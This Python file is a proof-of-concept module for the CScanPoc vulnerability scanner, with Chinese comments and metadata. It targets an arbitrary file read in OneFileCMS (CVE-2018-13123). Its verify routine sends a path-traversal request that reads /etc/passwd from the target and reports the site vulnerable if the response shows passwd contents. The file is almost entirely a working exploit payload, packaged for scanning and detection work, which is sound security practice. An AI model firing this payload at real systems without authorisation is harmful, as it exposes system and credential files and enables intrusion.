# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'OneFileCMS_0003'  # 平台漏洞编号，留空
    name = 'OneFileCMS信息泄露漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2018-07-04'  # 漏洞公布时间
    desc = '''
        OneFileCMS是一套轻量级CMS系统。该系统基于PHP和JavaScript运行，包括文档编辑、文件上传和文件管理等功能。
        OneFileCMS 2017-10-08及之前版本中的onefilecms.php文件存在安全漏洞。攻击者可借助‘i’和‘f’参数利用该漏洞读取任意文件。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-13461'  # 漏洞来源
    cnvd_id = 'CNVD-2018-13461'  # cnvd漏洞编号
    cve_id = 'CVE-2018-13123 '  # cve编号
    product = 'OneFileCMS'  # 漏洞应用名称
    product_version = '<=2017-10-08'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c59fbec6-245e-4e81-9c49-8414f7f038cd'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/onefilecms.php?i=etc/&f=passwd&p=raw_view'
            url = self.target + payload
            r = requests.get(url)

            if 'root' in r.text and 'bin/bash' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
